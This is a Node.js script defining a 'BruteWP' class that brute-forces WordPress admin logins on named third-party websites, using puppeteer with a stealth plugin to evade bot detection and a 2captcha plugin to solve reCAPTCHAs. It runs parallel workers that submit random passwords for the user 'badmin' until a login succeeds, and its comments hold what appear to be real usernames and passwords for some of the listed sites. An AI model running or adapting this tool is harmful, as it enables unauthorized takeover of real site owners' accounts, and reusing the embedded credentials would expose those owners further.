// gconf-service libasound2 libatk1.0-0 libatk-bridge2.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils wget
const cheerio = require('cheerio'),
    tress = require('tress'),
    needle = require('needle'),
    fs = require('fs'),
    path = require('path');
const puppeteer = require('puppeteer-extra');
// add stealth plugin and use defaults (all evasion techniques)
const pluginStealth = require("puppeteer-extra-plugin-stealth");
// add recaptcha plugin and provide it your 2captcha token
// 2captcha is the builtin solution provider but others work as well.
const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha'); ///dist/index
const recaptchaPlugin = RecaptchaPlugin({
    provider: {id: '2captcha', token: 'XXXXXXX'},
    visualFeedback: true
});
puppeteer.use(pluginStealth());
puppeteer.use(recaptchaPlugin);


require('events').EventEmitter.defaultMaxListeners = 0;
// console.log(require('events').EventEmitter.defaultMaxListeners)
// console.log(process)
class BruteWP {
    async init() {
        new Promise((resolve,reject) => {
            console.time("Brute Work");
            this.n = 0;
            this.brute = tress((data, callback) => {
                this.bruteInit(data, callback);
            }, 10);
            this.brute.drain = () => {
                console.timeEnd("Brute Work");
                resolve();
            };
            for ( let i = 0; i < 40; i++ ) {
                this.brute.push({});
            }

        });

    }
    async bruteInit() {
        // return new Promise(async (resolve, reject) => {
            let url = "https://babyforyou.org/wp-admin/";
            // let url = "https://artemida.ua/wp-admin/";
            // let url = "https://garbis.com.ua/wp-admin/";
            // let url = "https://holiday.ua/wp-admin/";
            // let url = "https://nobimu.no/wp-admin";
            puppeteer.launch({args: ["--no-sandbox", '--disable-setuid-sandbox'], headless: true}).then(async browser => {//this.browser =
                // const page = this.page = await browser.newPage();
                const page = await browser.newPage();
                // await page.setViewport({width: 1280, height: 800});
                await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36');
                await page.setJavaScriptEnabled(false);
                await page.goto(url);
                await page.solveRecaptchas();
                let status = "/wp-login.php";
                // let status = await this.checkPassword({login:"Garbis1",password:"nE3qMdsLPRAg"},page);

                // status = await this.checkPassword({login:"Garbis",password:"nE3qMdsLPRAg"},page);
                // status = await this.checkPassword({login:"WebDevTravel",password:"BVUj7(!kIin!Kcqs^UHHtf2r"},page);
                // status = await this.checkPassword({login:"museum-user",password:"H01eOiLTQjxagz5by5"},page);

                do {
                    status = await this.checkPassword(
                        {login:"badmin",
                            password:this.generatePassword( Math.floor((Math.random() * (25 - 6)) + 6)) },
                        page
                    );
                    this.n++;
                    if (Number.isInteger(this.n/100)) {
                        console.log("WHILE = ", this.n);
                    }
                } while (status == "/wp-login.php");
                this.brute.pause();
                console.log("FIND PASSWORD");
                resolve();
            });
            // needle.get("https://garbis.com.ua/wp-login.php", {},(err, res) => { // { agent: myAgent },
            //     console.log(res);
            //     if (err) {
            //         console.log(err,'err1');
            //     }
            //     // console.log(res,'res1')
            // });

            // needle.post("https://garbis.com.ua/wp-login.php", "log=Garbis&pwd=nE3qMdsLPRA1g&wp-submit=%D0%92%D0%BE%D0%B9%D1%82%D0%B8",(err, res) => { // { agent: myAgent },
            //     console.log(res);
            //     if (err) {
            //         console.log(err,'err2');
            //     }
            //     console.log(res,'res2')
            // });

            // needle.post("https://garbis.com.ua/wp-login.php", "log=Garbis&pwd=nE3qMdsLPRAg&wp-submit=%D0%92%D0%BE%D0%B9%D1%82%D0%B8&redirect_to=https%3A%2F%2Fgarbis.com.ua%2Fwp-admin%2F&testcookie=1",(err, res) => { // { agent: myAgent },
            //     console.log(res);
            //     if (err) {
            //         console.log(err,'err3');
            //     }
            //     console.log(res,'res3')
            // });

        // });
    }
    async checkPassword(data,page) {
        return new Promise(async (resolve, reject) => {
            // const page = this.page;
            // let urlEnd = true;
            // do {
               let element =  await page.$('input#user_login');
               await page.evaluate( el => el.value = "", element);
                // await page.focus('input#user_login');
                await page.type('input#user_login', data.login, {delay: 0});
                await page.$('input#user_pass');
                await page.type('input#user_pass', data.password, {delay: 0});
                // await page.click('input#wp-submit');
                // await page.waitForNavigation({waitUntil: 'networkidle0'});
                await Promise.all([
                    page.waitForResponse(response => response.url().indexOf("wp-login.php") > -1,{timeout: 15000}),
                    page.click('input#wp-submit')
                ]);
                let urlEnd = await page.evaluate(async () => location.pathname);
            console.log(urlEnd, "  ", data.password, " = ",data.password.length );
                resolve(urlEnd);
            // } while (urlEnd === '/wp-login.php')



        });
    }
    generatePassword(length = 24, special_chars = true, extra_special_chars = false) {
        let chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
            password = "";
        function randomInt(max) {
            return Math.floor(Math.random() * Math.floor(max));
        }
        if ( special_chars ) {
            chars += '!@#$%^&*()';
        }
        if ( extra_special_chars ) {
            chars += '-_ []{}<>~`+=,.;:/?|';
        }
        for ( let i = 0; i < length; i++ ) {
            password += chars.substr(randomInt(chars.length),1);
        }
        return password;
    }
}


(async function () {
    try {
        let brutewp = new BruteWP();
         brutewp.init().then(n => {console.log(n)});
        // await domains.parse("www.fragrantica.ru").then(n => {console.log(n)});
        // await domains.parse("vash-aromat.ru").then(n => {console.log(n)});
        // await domains.parse("car.ua").then(n => {console.log(n)});
        // await ads.parseKeyword("Новости Украина");
    } catch (e) {
        console.log(e);
    }

})();

// export default Parser;
module.exports = {
    BruteWP
};
